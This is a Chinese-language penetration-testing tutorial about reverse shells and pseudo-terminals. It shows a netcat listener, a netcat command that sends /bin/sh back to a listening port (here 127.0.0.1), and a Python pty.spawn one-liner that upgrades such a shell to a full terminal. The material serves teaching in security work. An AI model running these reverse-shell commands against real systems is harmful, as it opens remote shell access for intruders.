# 伪终端

## 伪终端

这一章,我们来讲讲如何使用 python 做一个伪终端.不过在这之前你需要先了解一点伪终端的意思,还有一些技巧.这个我们会在下面讲到:

伪终端其实就是命令终端(cmd.exe,/bin/sh)通过网络接口反弹给攻击者,或者是新建一个监听端口反弹一个终端给攻击者,值得注意的就是原终端对于标准的输入,输出是不做处理的(stdin/stdout/stderr),同样的反弹的 shell 也是不对它做处理的.(ssh 访问都是直接从键盘上读取).

这意味着有一些特殊的命令能够帮助你反弹 shell,像我们最常见的就是使用 netcat 命令来反弹 shell:

```py
#启动 netcat 监听器
~$ nc -lvp 443
listening on [any] 443 ...

# 使用 netcat 反弹'/bin/sh'
~$ nc 127.0.0.1 443 -e /bin/sh 
```

现在你可能注意到你看不到一些命令提示,我们输入几个命令试试:

```py
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)

uname -a
Linux kali 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64 GNU/Linux

ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
media
mnt
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var 
```

上面这些命令运行会很正常,但是当你运行一些需要用户再次输入验证或者是编辑的命令就可能会出现问题, 例如(FTP,SSH,vi 等),因为我们虚拟的终端它只有标准的输入输出功能,不会再次返回验证输入. 但是对于写文件我们可以使用 echo 命令来写入内容,这个对于现实是一点儿也不违和的.

在使用的过程中你也可能已经注意到了,它并有任何的提示性消息给您.这是因为命令的的提示消息是同过 STDERR 函数来传递的, 而在前面我们也讨论过我们实现的并不是一个原生终端,如果你想执行一些二进制的执行文件,譬如是 meterpeter 的执行文件就可能会出现错误.

对于已经安装了 python 的系统,我们可以使用 python 提供的 pty 模块,只需要一行脚本就可以创建一个原生的终端.下面是演示代码.执行第一行前 我还没有进入终端.

```py
python -c "import pty;pty.spawn('/bin/bash')"

kali@kali:/$ uname -a
uname -a
Linux kali 3.12-kali1-amd64 #1 SMP Debian 3.12.6-2kali1 (2014-01-06) x86_64 GNU/Linux

kali@kali:/$ id
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)

kali@kali:/$ ls
ls
bin    dev         home   lib64  opt      srv  usr
boot   initrd.img  media  proc   sbin     sys  var
etc    lib         mnt    root   selinux  tmp
kali@kali:/$ 
```

-c 参数选项允许我们直接在命令终端里面执行指定脚本,上面那段脚本,我使用分号把两行代码合并为了一行.这样写并不为过.还有一点. 就是双引号里面只能使用单引号把/bin/bash 引起来,如果使用双引号就出出现语法错误.就像下面这样:

```py
python -c "import pty;pty.spawn("/bin/bash")" 
```

虽然到目前为止写的虚拟终端并没有原生终端那样好,但是花点时间去折腾然后不断的去完善.相信会做的更好. 大家可能在渗透测试的时候会发现有些时候系统的命令终端是不允许直接访问的,那么这个时候用 Python 虚拟化一个终端相信会让你眼前一亮.